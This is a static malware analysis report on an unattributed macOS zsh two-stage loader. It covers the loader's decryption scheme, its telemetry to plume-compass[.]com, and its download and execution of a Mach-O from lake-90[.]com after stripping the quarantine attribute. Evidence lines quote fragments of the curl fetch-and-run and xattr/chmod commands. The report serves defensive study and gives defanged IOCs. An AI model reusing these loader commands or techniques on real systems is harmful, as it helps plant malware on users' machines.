---
title: "Malware Analysis: macOS two-stage shell loader (unattributed) (other · zsh · ef1c40e8)"
published: 2026-11-09
draft: false
description: "Malicious (low confidence): macOS two-stage shell loader (unattributed) · loader/downloader/dropper · difficulty medium · Pure static analysis"
tags: ["macOS two-stage", "loader", "downloader", "dropper", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-09-macOS-two-stage-shell-loader-unattributed-ef1c40e8"
---

> [!WARNING]
> **Verdict: Malicious** · Family **macOS two-stage shell loader (unattributed)** (uncertain) · Confidence **low**
> 
> Aliases: macOS zsh stager, Mach-O downloader
> 
> The outer zsh script treats four hex data segments as ciphertext, decrypts them with AES-128-CTR (zero IV) using MD5(1472) computed inside the script as the key, and gunzips the result into a plaintext second-stage zsh script (already statically recovered and checked). The second stage clearly uses curl to send telemetry with user/BuildID headers to plume-compass[.]com, downloads a Mach-O from lake-90[.]com into a hidden file under /tmp, and after running xattr -c to strip the quarantine attribute and chmod +x, runs it directly. The decrypted code is itself direct evidence and does not depend on executing the sample.

## Overview

| Item | Content |
|:--|:--|
| Family | **macOS two-stage shell loader (unattributed)** · aliases macOS zsh stager, Mach-O downloader · _uncertain_ |
| Confidence | **low** |
| Behavior class | loader · downloader · dropper |
| Difficulty | medium |
| First seen | 2026-11-06 16:28:22 |
| Analysis method | Pure static analysis |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/ef1c40e8bca817a3849062b064f6bb64b5ae146831ac64771e8df56111dfe2ec/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Decrypt embedded payload</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Pipe stage-two script into execution</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.004</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Hide commands with octal escapes</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Create fake update directory</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Collect host environment info</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1082</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `ef1c40e8bca817a3849062b064f6bb64b5ae146831ac64771e8df56111dfe2ec` |
| MD5 | _not recorded_ |
| Size | 2,896 bytes (2.8 KB) |
| Type | other · `zsh` |

## Behavior analysis

**9** behaviors in total, each backed by evidence, and all are statically available.

### 1. Decrypts embedded encrypted payload

`T1140` · Confidence **high** · static

It concatenates four hex strings (_schema_id, _feature_flags, _license_salt, _rollout_key) and restores them with xxd -r -p into 800 bytes of ciphertext, decrypts with AES-128-CTR (all-zero IV) using MD5 of _kb=1472 as the key, then gunzips to obtain a plaintext zsh script.

> **Evidence**: off 2618 _blob=(...) ; off 2693 _k=$(printf '%s' "$_kb" | md5) ; off 2729 openssl enc -d -aes-128-ctr -iv 000...0 | gunzip
> 
> **Source**: `ev-000001` · `ev-000002`

### 2. Pipes stage-two script into execution

`T1059.004` · Confidence **high** · static

It pipes the decrypted result via print -r -- directly into /bin/zsh for execution, without writing a script file to disk.

> **Evidence**: off 2867 print -r -- "$_r" | /bin/zsh
> 
> **Source**: `ev-000001` · `ev-000002`

### 3. Hides commands with octal escapes

`T1027` · Confidence **high** · static

It dynamically assembles curl, xattr, chmod and all URLs from printf octal escapes, evading plaintext keyword detection.

> **Evidence**: ge8n6/oeq1d/zcat8/ylp57 and the stage-two script's printf 'http...' sites
> 
> **Source**: `ev-000001` · `ev-000002`

### 4. Creates fake update directory

`T1036` · Confidence **high** · static

It creates a state directory at $HOME/Library/Caches/update_wjtdiu and writes a last_check timestamp, while printing channel: stable to masquerade as a normal software update check.

> **Evidence**: off 500 _state_dir="$HOME/Library/Caches/update_wjtdiu" ; off 1067 writes last_check ; off 1120 channel: stable
> 
> **Source**: `ev-000001`

### 5. Collects host environment information

`T1082` · Confidence **high** · static

The second-stage script runs whoami to get the current user and sysctl -n hw.memsize to read physical memory size, recording two RANDOM values.

> **Evidence**: stage-two script t6iibocn="$(whoami)" ; lqkhdae="$(sysctl -n hw.memsize ...)"
> 
> **Source**: `ev-000002`

### 6. Sends implant telemetry

`T1071.001` · Confidence **high** · static

It uses curl to send a POST to hxxps://plume-compass[.]com/api/metrics/run?event=pasted, carrying user and BuildID custom headers, silently in the background.

> **Evidence**: stage-two script curl -fsS -4 -X POST -H 'user: AgK...' -H 'BuildID: AgL...' "${dqg8aw}"
> 
> **Source**: `ev-000002`

### 7. Downloads second-stage payload

`T1105` · Confidence **high** · static

curl -fsSL downloads a file from hxxps://lake-90[.]com/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh to /tmp/.mlqio32we.$$ and moves it to /tmp/.mlqio32we.

> **Evidence**: stage-two script ${zih5w} -fsSL -o ${naiuzp} ${ocsrrx} && mv ${naiuzp} ${f070gm}
> 
> **Source**: `ev-000002`

### 8. Removes quarantine attribute

`T1553.001` · Confidence **high** · static

It runs xattr -c on the downloaded file to clear extended attributes (including com.apple.quarantine), then chmod +x to grant execute permission.

> **Evidence**: stage-two script ${fpxnu} -c ${f070gm} && ${njoom} +x ${f070gm} (fpxnu=xattr, njoom=chmod)
> 
> **Source**: `ev-000002`

### 9. Executes downloaded payload

`T1059.004` · Confidence **high** · static

After POSTing event=stager telemetry, it directly runs /tmp/.mlqio32we, handing execution to the downloaded Mach-O.

> **Evidence**: stage-two script ... && { curl ... event=stager ... & } && ${f070gm}
> 
> **Source**: `ev-000002`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the addresses above come from static analysis; under the analysis environment's network isolation no successful connection or session was observed, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://plume-compass[.]com/api/metrics/run?event=pasted` | 443 | c2 | static | ⏳ not observed |
| http | `hxxps://plume-compass[.]com/api/metrics/run?event=stager` | 443 | c2 | static | ⏳ not observed |
| http | `hxxps://lake-90[.]com/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh` | 443 | download | static | ⏳ not observed |

### Host

**Dropped paths**

- `$HOME/Library/Caches/update_wjtdiu`
- `$HOME/Library/Caches/update_wjtdiu/last_check`
- `/tmp/.mlqio32we.$$`
- `/tmp/.mlqio32we`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `plume-compass[.]com;lake-90[.]com` | yes | static |
| `c2_uri` | `/api/metrics/run?event=pasted;/api/metrics/run?event=stager;/f/fhi5wsf_mpmq1dks3tn4hw/oyn2lshh` | yes | static |
| `encryption_algo` | `AES-128-CTR (key=MD5(1472), IV=0) + gzip` | yes | static |
| `stage2_sha256` | `5847be4209b8c6d468fc41b389761c904c337c27c973a30260c4066cf19956d0` | no | static |
| `install_path` | `/tmp/.mlqio32we` | yes | static |
| `state_dir` | `$HOME/Library/Caches/update_wjtdiu` | no | static |
| `http_headers` | `user;BuildID` | no | static |

## Must not be misjudged

:::important
The following conclusions are **easy to misjudge**; keep them in mind when citing this report.

- Do not infer the second-stage Mach-O's exact family, theft targets or whether it belongs to a known macOS stealer solely from the download link and telemetry; that binary was neither obtained nor run in this analysis.
- The sample shows no file encryption, ransom notes or data wiping, so it should not be classified as ransomware or a wiper.
- This is a macOS/zsh script; no Windows registry, service or scheduled-task writes were found, so it should not be described in terms of Windows PE malware behavior.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Pure static analysis |
| Unpacking | No |

**Limitations and pending verification**

1. This run used the pure-static tier and did not execute the sample; all behaviors come from code review of the script and the statically decrypted second-stage script.
2. The second-stage Mach-O at lake-90[.]com was not downloaded or analyzed; its real function and family are unknown.
3. No network reachability or response verification was performed for any C2; all are marked static + pending_dynamic_verify.
4. YARA/multi-engine support is missing, so the family attribution is uncertain.

## Evidence index

<details>
<summary>Expand 2 tool evidence items</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | string extraction | performed ASCII/UTF-16 string extraction on the original .zsh, locating all variable assignments, hex ciphertext segments, MD5/xxd/openssl/gunzip derivation points and the print \| /bin/zsh execution point. |
| `ev-000002` | evidence.record | locally recreated _kb=1472 and the MD5 key following the script logic, completed the AES-128-CTR (zero IV) + gunzip static decryption, obtaining the second-stage zsh script (sha256 5847be...) and extracting the C2, download URL and command sequence; the sample was not executed. |

</details>

---

_This report's sample is not public, and IOCs are defanged; for security research only._
